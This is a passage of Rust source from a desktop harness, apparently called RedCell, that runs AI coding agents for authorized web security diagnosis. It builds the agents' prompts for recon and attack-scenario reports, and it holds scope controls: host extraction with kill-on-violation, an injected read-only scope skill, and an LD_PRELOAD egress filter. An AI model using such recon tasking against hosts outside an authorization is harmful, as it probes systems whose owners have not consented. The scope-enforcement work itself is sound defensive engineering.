/// pi CLI 경로 탐색. 실패 시 사람이 바로 알 수 있는 진단(탐색 후보·환경)을 함께 돌려준다.
fn prime_cli_path(redcell_dir: &str) -> Result<PathBuf, String> {
    let mut cands = prime_cli_candidates(redcell_dir);
    // 5) 마지막 보루: `npm root -g`(PATHEXT 포함 node/npm 탐색, Windows: cmd /C).
    if let Some(root) = npm_global_root() {
        cands.push(
            PathBuf::from(root)
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // pi 1.3.0 정식 진입점은 dist/bundle/cli.js (package.json bin) — 모든 dist/cli.js
    // 후보 앞에 bundle 변형을 우선 삽입하고, 구 레이아웃은 폴백으로 유지한다.
    let mut expanded: Vec<PathBuf> = Vec::with_capacity(cands.len() * 2);
    for c in cands {
        let s = c.to_string_lossy();
        if s.ends_with("dist/cli.js") || s.ends_with("dist\\cli.js") {
            let mut b = c.clone();
            b.pop(); // cli.js 제거 → .../dist
            b.push("bundle");
            b.push("cli.js");
            expanded.push(b);
        }
        expanded.push(c);
    }
    let cands = expanded;
    if let Some(found) = cands.iter().find(|p| p.is_file()) {
        return Ok(found.clone());
    }
    // 진단: 후보 + 환경 요약을 모아 에러로.
    let mut diag = Vec::new();
    for c in cands.iter().take(14) {
        diag.push(format!("  - {}", c.display()));
    }
    let envpick = |k: &str| -> String {
        std::env::var_os(k).map(|v| v.to_string_lossy().into_owned()).unwrap_or_else(|| "(미설정)".into())
    };
    let node = first_on_path("node").map(|p| p.display().to_string()).unwrap_or_else(|| "없음".into());
    let pi = first_on_path("pi").map(|p| p.display().to_string()).unwrap_or_else(|| "없음".into());
    Err(format!(
        "prime-agent(pi) 를 찾을 수 없습니다.\n확인한 후보:\n{}\n환경: HOME={}, USERPROFILE={}, PATH에 node={}, pi={}\n해결: PowerShell 에서 `npm i -g @earendil-works/pi-coding-agent` 실행 후 앱 재시작, 또는 REDCELL_PI_DIR 환경변수로 패키지 디렉터리 지정.",
        diag.join("\n"),
        envpick("HOME"),
        envpick("USERPROFILE"),
        node,
        pi,
    ))
}

/** prime 모드 cwd: .pi/agent/extensions/redcell 이 있으면 프로젝트 루트(확장 로드), 아니면 redcell_dir. */
fn prime_cwd(redcell_dir: &str) -> PathBuf {
    let root = Path::new(redcell_dir)
        .parent()
        .unwrap_or_else(|| Path::new(redcell_dir));
    if root.join(".pi").join("agent").join("extensions").join("redcell").exists() {
        return root.to_path_buf();
    }
    PathBuf::from(redcell_dir)
}

/// 실행 엔진 — pi-coding-agent(기본) | prime-agent(Rust 하네스, 직접 실행).
#[derive(Clone, Copy, PartialEq, Eq)]
enum Engine {
    Pi,
    Prime,
}

fn session_engine(s: &Session) -> Engine {
    if s.engine.trim().eq_ignore_ascii_case("prime") {
        Engine::Prime
    } else {
        Engine::Pi
    }
}

/// 툴 호출 인자에서 대상 호스트들을 추출한다 (반응형 스코프 게이트용).
/// 수집원: http(s) URL·IPv4 리터럴(전체 직렬화 스캔) + host/hostname/url/target/domain
/// 키의 베어 값. 소문자 정규화·포트 제거·중복 제거. 대상 없는 순수 로컬 호출은 빈 벡터.
fn extract_hosts(_tool_name: &str, args: &Value) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut push = |h: String| {
        let h = h.trim().trim_end_matches('.').to_lowercase();
        if !h.is_empty() && !out.contains(&h) {
            out.push(h);
        }
    };
    // 1) URL 스킴 스캔.
    let s = args.to_string();
    for needle in ["https://", "http://"] {
        let mut rest = s.as_str();
        while let Some(pos) = rest.find(needle) {
            let after = &rest[pos + needle.len()..];
            let host = after
                .split(['/', '?', '#', '"', '\'', ' ', '\t', '\n', ')', ']', '}'].as_ref())
                .next()
                .unwrap_or("");
            let host = host.split('@').next_back().unwrap_or(host); // userinfo 제거
            let host = host.split(':').next().unwrap_or(host); // 포트 제거
            let host = host.trim_matches(|c| c == '[' || c == ']');
            if !host.is_empty() {
                push(host.to_string());
            }
            rest = after;
        }
    }
    // 2) IPv4 리터럴 스캔.
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i].is_ascii_digit() {
            let mut j = i;
            while j < bytes.len() && (bytes[j].is_ascii_digit() || bytes[j] == b'.') {
                j += 1;
            }
            let tok = &s[i..j];
            let parts: Vec<&str> = tok.split('.').collect();
            if parts.len() == 4 && parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok()) {
                push(tok.to_string());
            }
            i = j;
        } else {
            i += 1;
        }
    }
    // 3) host 계열 키의 베어 값 (스킴 없는 도메인·IP).
    if let Some(obj) = args.as_object() {
        for key in ["host", "hostname", "url", "target", "domain", "server"] {
            if let Some(v) = obj.get(key).and_then(|v| v.as_str()) {
                let mut h = v.trim().to_string();
                for needle in ["https://", "http://"] {
                    if let Some(pos) = h.find(needle) {
                        h = h[pos + needle.len()..].to_string();
                    }
                }
                h = h.split(['/', '?', '#'].as_ref()).next().unwrap_or("").to_string();
                h = h.split('@').next_back().unwrap_or(&h).to_string();
                // 포트 제거 — 단 IPv6 리터럴(:: 포함)은 통째로 둔다.
                if h.matches(':').count() <= 1 {
                    h = h.split(':').next().unwrap_or(&h).to_string();
                }
                h = h.trim_matches(|c| c == '[' || c == ']').to_string();
                if !h.is_empty() && !h.contains(char::is_whitespace) {
                    push(h);
                }
            }
        }
    }
    out
}

/// 반응형 스코프 게이트 판정 — prime-agent 엔진용 (pi는 확장 훅이 사전 차단).
/// 인가 밖 호스트가 하나라도 있으면 위반 사유를 돌려주고, 호출자는 프로세스를 kill 한다.
/// YAML scope 는 데스크톱이 해석할 수 없어 kill 하지 않는다(스킬 수준 제약만 + 경고).
fn decide_tool_violation(auth: &auth::AuthList, tool_name: &str, args: &Value) -> Option<String> {
    if auth.yaml {
        return None;
    }
    for host in extract_hosts(tool_name, args) {
        if !auth::is_host_allowed(auth, &host) {
            return Some(format!(
                "RedCell scope 위반(반응형 게이트): {tool_name} → {host} — 인가 목록에 없어 prime-agent 프로세스를 중단합니다."
            ));
        }
    }
    None
}

/// prime-agent 주입용 스코프 스킬 템플릿 — 실행마다 인가 목록을 채워 --skill 로 전달.
/// prime-agent 에는 tool_call 훅이 없어 (1) 스킬 지시 + (2) 반응형 kill + (3) 읽기 전용
/// 태스킹의 3중 방어로 scope 를 강제한다.
const SCOPE_SKILL_TEMPLATE: &str = r#"---
name: redcell-scope
description: RedCell authorization scope for this diagnosis run. Restricts every network touch to the listed allow targets (deny list wins). Read-only recon only.
---

# RedCell Scope (this run only)

You are running inside RedCell, an authorized security-diagnosis harness.
Every network touch MUST stay inside this scope — no exceptions.

## Allow targets (only these)
{ALLOWS}

## Deny targets (never touch, even if allow-listed above)
{DENIES}

## Rules
- Touch ONLY the allow targets above. If a redirect, link, or API response
  points outside them, STOP that branch and report it as out-of-scope.
- If NO allow target is listed, touch NOTHING on the network — local reasoning only.
- Web recon uses `python_repl` with urllib/requests: read-only GET/HEAD,
  10s timeout, at most 40 paths per host. No POST/PUT/DELETE, no brute force,
  no destructive payloads, no mass requests.
- Always use full `http(s)://host/...` URLs so the harness gate can audit them.
- This machine's filesystem (bash/read/edit/write outside the session work dir)
  is NOT a target — never snoop the local computer; write deliverables only.
- Report format is dictated by the task prompt, not this skill.
"#;

/// 스코프 스킬 생성 — prime 세션 디렉터리에 SKILL.md 를 쓰고 경로를 돌려준다.
fn write_scope_skill(dir: &Path, allows: &[String], denies: &[String]) -> Result<PathBuf, String> {
    fs::create_dir_all(dir).map_err(|e| format!("스킬 디렉터리 생성 실패: {e}"))?;
    let fmt = |xs: &[String]| {
        if xs.is_empty() {
            "(없음 — 네트워크 접촉 금지)".to_string()
        } else {
            xs.iter().map(|x| format!("- {x}")).collect::<Vec<_>>().join("\n")
        }
    };
    let text = SCOPE_SKILL_TEMPLATE
        .replacen("{ALLOWS}", &fmt(allows), 1)
        .replacen("{DENIES}", &fmt(denies), 1);
    let path = dir.join("SKILL.md");
    fs::write(&path, text).map_err(|e| format!("스킬 기록 실패: {e}"))?;
    Ok(path)
}

/// prime-agent 바이너리 탐색 — REDCELL_PRIME_BIN 환경변수 → PATH.
fn prime_agent_path() -> Result<PathBuf, String> {
    if let Some(d) = std::env::var_os("REDCELL_PRIME_BIN") {
        let b = PathBuf::from(d);
        if b.is_file() {
            return Ok(b);
        }
        return Err(format!(
            "REDCELL_PRIME_BIN='{}' 파일을 찾을 수 없습니다.",
            b.display()
        ));
    }
    first_on_path("prime-agent").ok_or_else(|| {
        "prime-agent 바이너리를 찾을 수 없습니다 (PATH에 없음).\n해결: prime-agent 를 설치해 PATH에 두거나, REDCELL_PRIME_BIN 환경변수로 바이너리 경로를 지정하세요. pi 엔진은 그대로 사용할 수 있습니다.".to_string()
    })
}

/// prime-agent 모델 설정 경로: ~/.prime/agent/models.json (pi 와 동일 스키마).
fn prime_models_json_path() -> Result<PathBuf, String> {
    user_home()
        .map(|h| h.join(".prime").join("agent").join("models.json"))
        .ok_or_else(|| "홈 디렉터리(HOME/USERPROFILE)를 찾을 수 없습니다.".to_string())
}

/// prime-agent 세션 디렉터리 — 앱 데이터 prime-sessions/<세션id>/<태그>.
fn prime_session_dir(app: &AppHandle, id: &str, tag: &str) -> PathBuf {
    let d = root(app).join("prime-sessions").join(id).join(tag);
    fs::create_dir_all(&d).ok();
    fs::create_dir_all(d.join("work")).ok();
    d
}

fn prime_session_has_history(dir: &Path) -> bool {
    fs::read_dir(dir).map(|mut rd| rd.any(|_| true)).unwrap_or(false)
}

/// prime-agent 실행 인자 조립 — --mode json --print --skill --session-dir [--continue].
/// 모델/키 규칙은 pi 와 동일 (--provider/--model/--api-key), custom/ollama 는
/// ~/.prime/agent/models.json 에 병합한다 (실측: pi 와 동일 스키마).
fn prime_run_args(
    settings: &Settings,
    provider: &str,
    skill: &Path,
    session_dir: &Path,
    cont: bool,
    instruction: String,
) -> Result<(PathBuf, Vec<String>), String> {
    let bin = prime_agent_path()?;
    let mut args: Vec<String> = vec![
        "--mode".into(),
        "json".into(),
        "--print".into(),
        instruction,
        "--skill".into(),
        skill.to_string_lossy().into_owned(),
        "--session-dir".into(),
        session_dir.to_string_lossy().into_owned(),
    ];
    if cont {
        args.push("--continue".into());
    }
    args.push("--provider".into());
    args.push(provider.to_string());
    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
    if needs_models_json_sync(provider) {
        let mpath = prime_models_json_path()?;
        sync_pi_models_json_at(&mpath, provider, &sync_base_url(provider, &conn), &conn.api_key, &conn.model, &sync_api(provider, &conn))?;
    }
    {
        let m = conn.model.trim().to_string();
        if !m.is_empty() {
            args.push("--model".into());
            args.push(if provider == "custom" || provider == "ollama" { m } else { format!("{provider}/{m}") });
        } else if let Some(d) = PROVIDER_CATALOG.iter().find(|x| x.name == provider) {
            if !d.default_model.is_empty() && provider != "custom" {
                let d = d.default_model.to_string();
                args.push("--model".into());
                args.push(if needs_models_json_sync(provider) { d } else { format!("{provider}/{d}") });
            }
        }
    }
    // `!명령` 키(pi !command)는 models.json 에만 살고 CLI 로 넘기지 않는다 — argv 리터럴은
    // 명령으로 해석되지 않아 인증이 깨진다.
    if !conn.api_key.trim().is_empty() && !conn.api_key.trim_start().starts_with('!') {
        args.push("--api-key".into());
        args.push(conn.api_key.trim().to_string());
    }
    Ok((bin, args))
}

/// prime-agent 도구 안내 — web_fetch 이 없고 python_repl 이 유일 통로이므로(실측),
/// urllib 읽기 전용 패턴을 지시문에 덧붙인다 (진단·워커·collector 공용).
const PRIME_TOOLING: &str = r#"## prime-agent 도구 사용법 (반드시 준수)
- 이 환경에는 web_fetch 같은 웹 도구가 없다. 웹 조회는 **python_repl 하나**로만 한다.
- 패턴 (읽기 전용 GET/HEAD, 타임아웃 10초):
  ```python
  import urllib.request
  req = urllib.request.Request("https://대상/...", headers={"user-agent": "Mozilla/5.0 (RedCell authorized-agent)"}, method="GET")
  res = urllib.request.urlopen(req, timeout=10)
  print(res.status, res.headers.get_content_type())
  print(res.read(400_000).decode("utf-8", "replace"))
  ```
- 헤더·쿠키 원문이 필요하면 `res.headers.as_string()` 를 출력한다.
- POST/PUT/DELETE·브루트포스·파괴적 페이로드·대량 요청 금지. 인가 밖 URL 은 시도조차 금지.
- 로컬 파일(bash·read·edit·write)은 결과물 저장 외에 건드리지 않는다.
"#;

/// 단일 턴 지시문 조립 — pi/prime 공용. prime 은 web_fetch 언급을 python_repl+urllib 로
/// 치환하고 PRIME_TOOLING 을 덧붙인다 (prime-agent 에 web_fetch 이 없음 — 실측).
fn prime_adapt(instruction: String) -> String {
    format!("{}\n{PRIME_TOOLING}", instruction.replace("web_fetch", "python_repl+urllib"))
}

fn turn_instruction(app: &AppHandle, s: &Session, engine: Engine) -> String {
    let target = target_url(&s.host, s.port);
    let mut goal = s.goal.trim().to_string();
    if goal.is_empty() {
        goal = if s.diag {
            "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
        } else {
            "아래 사이트를 샅샅이 살펴보고 유용한 정보·정리된 자료를 찾아 정리해줘.".to_string()
        };
    }
    let base = if s.diag {
        // 서비스 진단 모드: 시니어 멘토 스타일 공격 시나리오 리포트.
        let mem = memory_block(app, &s.host);
        let scope = if s.host.trim().is_empty() {
            "실측 없이 설명 기반 진단 — 추정은 [가정] 으로 표시".to_string()
        } else {
            format!(
                "대상 사이트(인가됨): {target}\n{}\n실측 정찰 순서대로 서비스 모델을 세운 뒤 보고서를 작성한다.",
                https_hint_for(&s.host, s.port)
            )
        };
        format!("{DIAG_ROLE}\n\n## 서비스 설명\n\n{goal}\n\n## 진단 경계\n{scope}\n{mem}\n{REPORT_SPEC}")
    } else if s.host.trim().is_empty() {
        // 대상 미지정: 순수 CLI 대화(인가 게이트는 대상 없는 로컬 작업만 통과).
        goal
    } else {
        let tool_line = if engine == Engine::Prime {
            "중요: 웹 조사는 python_repl + urllib 로 수행한다(아래 PRIME_TOOLING 패턴)."
        } else {
            "중요: 웹 조사는 반드시 web_fetch 툴로 수행한다."
        };
        format!(
            "{goal}\n\n대상 사이트(인가됨): {target}\n{}\n인가 목록에 있는 대상이므로 필요한 만큼 자유롭게 조사·탐색하고 결과를 정리해줘.\n{tool_line} 이 컴퓨터의 파일 시스템(bash/read/edit/write)은 조사 대상이 아니라 — 결과물 저장 외에 로컬 머신을 뒤지지 마라.",
            https_hint_for(&s.host, s.port)
        )
    };
    if engine == Engine::Prime && !s.host.trim().is_empty() {
        prime_adapt(base)
    } else {
        base
    }
}

/** prime 모드 실행: node <pi cli.js> --mode json -p "<목표>" — json 이벤트를 패널로 스트리밍. */
fn run_prime(
    app: &AppHandle,
    id: &str,
    s: &Session,
    settings: &Settings,
    redcell: &str,
    provider: &str,
) -> Result<(), String> {
    // 연속 대화: pi 세션 id 를 세션에 보관하고, 같은 id 로 --session-id 를 넘겨
    // CLI 처럼 이전 대화를 이어간다(첫 턴에 생성·저장, 이후 턴은 재사용).
    let s2 = ensure_piq(app, s);
    let piq = s2.piq.clone();
    let mut instruction = turn_instruction(app, &s2, Engine::Pi);
    // 단일 진단 모드에서도 P0 스윕 증거를 주입 (대상이 있을 때만).
    if s2.diag && !s2.host.trim().is_empty() {
        let sweep = run_p0_sweep(app, id, &s2.host, s2.port, &s2.auth_cookie, s2.danger_consent);
        instruction.push_str(&p0_evidence_block(&sweep, 6000));
    }

    // RedCell 인가 확장(scope 게이트)을 `-e` 로 **명시 로드**한다 — 전역 설치·트러스트·settings
    // 병합이 없어도 패널에서 항상 게이트가 켜진다(다른 프로젝트의 pi 세션엔 영향 없음).
    let ev3 = json!({ "type": "note", "text": "[sys] 인가 게이트: RedCell 확장을 -e 로 명시 로드 — pi 의 모든 툴 호출을 인가 목록으로 검사합니다(이 세션만)." });
    let stamped3 = append_event(app, id, &ev3);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped3 })).ok();

    // 동기 프리플라이트 — pi 미설치면 즉시 Err (UI 즉시 안내).
    prime_cli_path(redcell)?;
    {
        let ev = json!({ "type": "note", "text": format!("[sys] pi 턴 — session {piq}.") });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    let prep = prepare_engine_run(app, id, Engine::Pi, settings, provider, redcell, &piq, instruction, false)?;
    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
    set_status(app, id, "running");
    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();

    // 펌프+마감은 백그라운드 스레드에서.
    {
        let app = app.clone();
        let id = id.to_string();
        let prefix = prep.tool_prefix;
        thread::spawn(move || {
            let outcome = pump_and_wait(&app, &id, &id, pipes, None, prefix, None);
            finalize_run(&app, &id, &outcome, "pi");
        });
    }
    Ok(())
}

/// 엔진 실행 준비물 — 스폰 전 확정 (인자·스킬·세션dir·게이트 재료).
struct PreparedRun {
    prog: PathBuf,
    args: Vec<String>,
    cwd: PathBuf,
    tool_prefix: &'static str,
    enforce_auth: Option<auth::AuthList>,
    extra_env: Vec<(String, String)>,
}

/// 선행 차단(netfilter) .so 탐색 — REDCELL_NETFILTER_SO > 실행파일 옆 > cwd.
fn netfilter_so_path() -> Option<PathBuf> {
    if let Some(p) = std::env::var_os("REDCELL_NETFILTER_SO").filter(|p| !p.is_empty()) {
        let p = PathBuf::from(p);
        if p.is_file() {
            return Some(p);
        }
        return None; // 명시 지정이 깨졌으면 폴백 탐색하지 않음 (설정 오류 은폐 방지)
    }
    let name = "libredcell_netfilter.so";
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            // 실행파일 옆 (배포 레이아웃 + build.rs 복사본).
            let p = dir.join(name);
            if p.is_file() {
                return Some(p);
            }
            // deps/ 아래 exe(테스트) — 자기 옆 산출물 + 한 단계 위 프로필 디렉터리.
            if dir.file_name().map(|f| f == "deps").unwrap_or(false) {
                if let Some(par) = dir.parent() {
                    let p = par.join(name);
                    if p.is_file() {
                        return Some(p);
                    }
                }
            } else {
                // dev exe 옆에 없으면 deps/ 원본 확인.
                let p = dir.join("deps").join(name);
                if p.is_file() {
                    return Some(p);
                }
            }
        }
    }
    let cwd = PathBuf::from(name);
    if cwd.is_file() {
        return std::fs::canonicalize(cwd).ok();
    }
    None
}

/// 프로바이더 API 호스트 — conn.base_url 우선, 없으면 카탈로그 기본값.
fn provider_api_host(provider: &str, settings: &Settings) -> Option<String> {
    let custom = settings.providers.get(provider).map(|c| c.base_url.trim()).filter(|s| !s.is_empty());
    let base = custom.or_else(|| {
        PROVIDER_CATALOG.iter().find(|p| p.name == provider).map(|p| p.base_url)
    })?;
    redcell_netfilter::extract_host(base)
}

/// ALLOW/DENY 스펙 조립 (순수 함수 — 테스트 용이).
/// allows + 세션 대상 + 프로바이더 호스트, denies 는 제외로 전달한다.
fn build_netfilter_spec(allows: &[String], denies: &[String], extra_hosts: &[String]) -> (String, String) {
    let mut seen = std::collections::HashSet::new();
    let mut allow: Vec<String> = Vec::new();
    for raw in allows.iter().chain(extra_hosts.iter()) {
        let t = raw.trim();
        if t.is_empty() || !seen.insert(t.to_ascii_lowercase()) {
            continue;
        }
        // 파싱 불가한 쓰레기는 여기서 제거 (쓰레기가 전체를 무력화하지 않게).
        if redcell_netfilter::AllowEntry::parse(t).is_some() {
            allow.push(t.to_string());
        }
    }
    let mut deny: Vec<String> = Vec::new();
    for raw in denies {
        let t = raw.trim();
        if !t.is_empty() && redcell_netfilter::AllowEntry::parse(t).is_some() {
            deny.push(t.to_string());
        }
    }
    (allow.join(","), deny.join(","))
}

/// 선행 차단 env 조립 — Linux + .so 존재 시에만 비어 있지 않음.
/// 비어 있으면 호출자가 기존 방어(pi 훅 / 반응형 킬게이트)로 동작한다.
fn netfilter_extra_env(
    app: &AppHandle,
    id: &str,
    auth: &auth::AuthList,
    provider: &str,
    settings: &Settings,
) -> Vec<(String, String)> {
    if !cfg!(target_os = "linux") {
        return vec![];
    }
    let Some(so) = netfilter_so_path() else {
        return vec![];
    };
    let mut extra: Vec<String> = Vec::new();
    if let Some(s) = read_session(app, id) {
        if let Some(h) = redcell_netfilter::extract_host(&s.host) {
            extra.push(h);
        }
    }
    if let Some(h) = provider_api_host(provider, settings) {
        extra.push(h);
    }
    let (allow, deny) = build_netfilter_spec(&auth.allows, &auth.denies, &extra);
    let log = sessions_dir(app).join(format!("netfilter-{id}.log"));
    let mut env = vec![
        ("LD_PRELOAD".to_string(), so.to_string_lossy().into_owned()),
        ("REDCELL_NETFILTER_ALLOW".to_string(), allow),
        ("REDCELL_NETFILTER_LOG".to_string(), log.to_string_lossy().into_owned()),
    ];
    if !deny.is_empty() {
        env.push(("REDCELL_NETFILTER_DENY".to_string(), deny));
    }
    env
}

/// 선행 차단 상태 노트 (활성/폴백을 실행마다 명시 — 보안 상태는 숨기지 않는다).
fn emit_netfilter_note(app: &AppHandle, id: &str, active: bool) {
    let text = if active {
        "[sys] 선행 차단 활성화(Linux egress 필터) — 인가 밖 연결·DNS 는 호출 전에 차단됩니다(반응형 킬게이트와 이중 방어, 감사: sessions/netfilter-<id>.log)."
    } else if cfg!(target_os = "linux") {
        "[sys] 선행 차단 .so 없음 — 반응형 킬게이트로 동작합니다(`cargo build` 로 libredcell_netfilter.so 생성 시 활성화)."
    } else {
        "[sys] 선행 차단은 Linux 전용 — 이 OS 에서는 기존 방어(pi 훅/반응형 킬게이트)로 동작합니다."
    };
    let ev = json!({ "type": "note", "text": text });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
}

fn prepare_engine_run(
    app: &AppHandle,
    id: &str,
    engine: Engine,
    settings: &Settings,
    provider: &str,
    redcell: &str,
    run_tag: &str,
    instruction: String,
    quiet: bool, // true = 방어 상태 노트를 생략 (심층 워커·사전 점검 — 실행당 1회만 출력)
) -> Result<PreparedRun, String> {
    match engine {
        Engine::Pi => {
            let (cli, args, cwd) = pi_cli_args(settings, provider, redcell, run_tag, instruction)?;
            let node = first_on_path("node").unwrap_or_else(|| PathBuf::from("node"));
            let mut full = vec![cli.to_string_lossy().into_owned()];
            full.extend(args);
            // 선행 차단 (pi 확장 훅과 이중 방어).
            let auth = auth::load(&resolve_app_auth_path(app));
            let nf = netfilter_extra_env(app, id, &auth, provider, settings);
            if !quiet {
                emit_netfilter_note(app, id, !nf.is_empty());
            }
            Ok(PreparedRun {
                prog: node,
                args: full,
                cwd,
                tool_prefix: "pi-툴",
                enforce_auth: None,
                extra_env: nf,
            })
        }
        Engine::Prime => {
            let auth = auth::load(&resolve_app_auth_path(app));
            let sdir = prime_session_dir(app, id, run_tag);
            let skill = write_scope_skill(&sdir.join("redcell-scope"), &auth.allows, &auth.denies)?;
            let cont = prime_session_has_history(&sdir);
            let (bin, args) = prime_run_args(settings, provider, &skill, &sdir, cont, instruction)?;
            if auth.yaml && !quiet {
                let ev = json!({ "type": "note", "text": "[sys] 경고: 인가 파일이 정식 YAML 이라 prime-agent 반응형 킬게이트가 동작하지 않습니다 — 선행 차단(세션 대상 단일 호스트)으로 강제됩니다." });
                let stamped = append_event(app, id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            // 선행 차단 (반응형 킬게이트와 이중 방어 — 위반 호출의 첫 실행 자체를 막는다).
            let mut extra_env = vec![("PRIME_AGENT_TELEMETRY".to_string(), "0".to_string())];
            let nf = netfilter_extra_env(app, id, &auth, provider, settings);
            emit_netfilter_note(app, id, !nf.is_empty());
            extra_env.extend(nf);
            Ok(PreparedRun {
                prog: bin,
                args,
                cwd: sdir.join("work"),
                tool_prefix: "prime-툴",
                enforce_auth: if auth.yaml { None } else { Some(auth) },
                extra_env,
            })
        }
    }
}

fn spawn_prepared(
    prep: &PreparedRun,
    provider: &str,
    settings: &Settings,
) -> Result<(Child, PiPipes), String> {
    let ee: Vec<(&str, &str)> = prep.extra_env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    launch_child(&prep.prog, &prep.args, &prep.cwd, provider, settings, &ee, "엔진 실행 실패")
}

/// LLM 연결 사전 점검 — 1턴 핑으로 프로바이더 실동작을 확인한다.
/// 키·모델·API 방언·base URL 문제는 워커 5개가 모두 400 을 내고 collector 가
/// "비정상 종료" 하기 전에, 여기서 원인 1건으로 잡아낸다 (심층 진단 전용).
fn preflight_llm_check(
    app: &AppHandle,
    id: &str,
    engine: Engine,
    settings: &Settings,
    provider: &str,
    redcell: &str,
    piq: &str,
) -> Result<(), String> {
    let ping = "연결 확인 핑입니다. 어떤 도구도 사용하지 말고 'pong' 이라고만 답하세요.".to_string();
    // 본 대화 세션을 더럽히지 않게 버림 세션 id 로 실행한다.
    let run_tag = if engine == Engine::Prime { "ping".to_string() } else { format!("{piq}-ping") };
    let prep = prepare_engine_run(app, id, engine, settings, provider, redcell, &run_tag, ping, true)?;
    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
    let key = format!("{id}#preflight");
    app.state::<Procs>().0.lock().unwrap().insert(key.clone(), child);
    let app2 = app.clone();
    let id2 = id.to_string();
    let key2 = key.clone();
    let prefix = prep.tool_prefix;
    let (tx, rx) = std::sync::mpsc::channel();
    thread::spawn(move || {
        let outcome = pump_and_wait(&app2, &id2, &key2, pipes, None, prefix, None);
        let _ = tx.send(outcome);
    });
    let timeout = std::time::Duration::from_secs(90);
    let outcome = match rx.recv_timeout(timeout) {
        Ok(o) => o,
        Err(_) => {
            // 시간 초과 — 자식을 정리하고 실패로 마감.
            if let Some(mut c) = app.state::<Procs>().0.lock().unwrap().remove(&key) {
                let _ = c.kill();
            }
            return Err(format!(
                "모델 연결 확인(핑) 시간 초과 ({:?}) — '{provider}' 엔드포인트가 응답하지 않습니다. 네트워크·base URL 을 확인하세요.",
                timeout
            ));
        }
    };
    if outcome.failed || outcome.aborted {
        let detail = if outcome.error.is_empty() { "오류 메시지 없음".to_string() } else { outcome.error.clone() };
        let why = classify_ping_failure(settings, provider, &detail);
        return Err(format!(
            "모델 연결 확인(핑) 실패 — provider '{provider}'\n{why}\n설정(⚙) > 프로바이더에서 연결 테스트를 실행해 API 키·모델명·API 방식을 확인하세요."
        ));
    }
    Ok(())
}

/// pi CLI 버전 — `node <cli.js> --version` 첫 줄 (3초 타임아웃, 실패 시 "미확인").
fn pi_cli_version(settings: &Settings) -> String {
    let fail = || "미확인".to_string();
    let Ok(cli) = prime_cli_path(&settings.redcell_dir) else { return fail(); };
    let Some(node) = first_on_path("node") else { return fail(); };
    let mut probe = Command::new(node);
    probe.arg(&cli).arg("--version").stdout(Stdio::piped()).stderr(Stdio::null());
    hide_window(&mut probe);
    let Ok(mut child) = probe.spawn() else { return fail(); };
    let mut waited = 0;
    loop {
        match child.try_wait() {
            Ok(Some(st)) if st.success() => {
                use std::io::Read;
                let mut out = String::new();
                if let Some(mut o) = child.stdout.take() {
                    let _ = o.read_to_string(&mut out);
                }
                let v = out.lines().next().unwrap_or("").trim().to_string();
                return if v.is_empty() { fail() } else { v };
            }
            Ok(Some(_)) => return fail(),
            Ok(None) => {}
            Err(_) => return fail(),
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
        waited += 100;
        if waited > 3000 {
            let _ = child.kill();
            return fail();
        }
    }
}

/// 핑 실패 원인 분류 — pi 를 거치지 않는 직통 최소 요청(연결 테스트와 동일 경로)으로
/// 계층을 가린다. "400 (no body)" 처럼 본문 없는 오류는 원인이 안 보이므로, 같은
/// 엔드포인트에 앱이 직접 1토큰을 쏴서 어디가 거부했는지 한 줄로 판정한다:
///   직통 OK  → 엔드포인트·키·모델 정상, pi 엔진 경로(버전/프록시/헤더) 문제
///   401/403  → 키 문제 (토큰 재발급 안내)
///   그 외    → 엔드포인트/네트워크 문제 (게이트웨이 본문이 있으면 그대로 노출)
fn classify_ping_failure(settings: &Settings, provider: &str, ping_error: &str) -> String {
    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
    let key = conn.api_key.trim().to_string();
    let mut lines = vec![format!("핑 오류: {ping_error}")];
    if key.is_empty() {
        lines.push(
            "원인: API 키 미설정 — 설정(⚙) > 프로바이더 > 이 카드에 토큰을 붙여넣고 연결 저장을 누르세요.".into(),
        );
        return lines.join("\n");
    }
    let base = sync_base_url(provider, &conn);
    let api = sync_api(provider, &conn);
    let ver = pi_cli_version(settings);
    match probe_provider_endpoint(provider, &key, &base, &api, &conn.model) {
        Ok(line) => {
            lines.push(format!(
                "분류: 엔드포인트 직통 요청은 성공({line}) — 키·모델·API 방식 모두 정상입니다."
            ));
            lines.push(format!(
                "→ pi 엔진({ver})의 요청만 거부됐습니다. pi 버전이 오래됐거나(재설치 권장), 사내 프록시/보안 장비가 pi 요청의 특정 헤더·필드를 걸러내는 것일 수 있습니다 — 프록시 차단 로그를 확인하세요."
            ));
        }
        Err(e) if e.contains("401") || e.contains("403") => {
            lines.push(format!(
                "분류: 엔드포인트가 키를 거부했습니다({e}) — 토큰이 만료됐을 수 있습니다. 터미널 `ug auth-token` 출력을 다시 카드에 붙여넣으세요."
            ));
        }
        Err(e) => {
            lines.push(format!("분류: 엔드포인트 직통 요청도 실패 — {e}"));
            lines.push(
                "→ base URL·API 방식을 점검하세요. 오류 본문이 비어 있다면 중간 프록시/네트워크 차단일 확률이 높습니다.".into(),
            );
        }
    }
    lines.join("\n")
}

/// 펌프+대기 — 등록된 자식을 펌핑하고 제거·대기한 뒤 outcome 을 확정한다.
/// 레지스트리에 없으면(중지됨) aborted 로 마감한다.
fn pump_and_wait(
    app: &AppHandle,
    id: &str,
    proc_key: &str,
    pipes: PiPipes,
    worker: Option<WorkerTag>,
    tool_prefix: &str,
    enforce_auth: Option<auth::AuthList>,
) -> PumpOutcome {
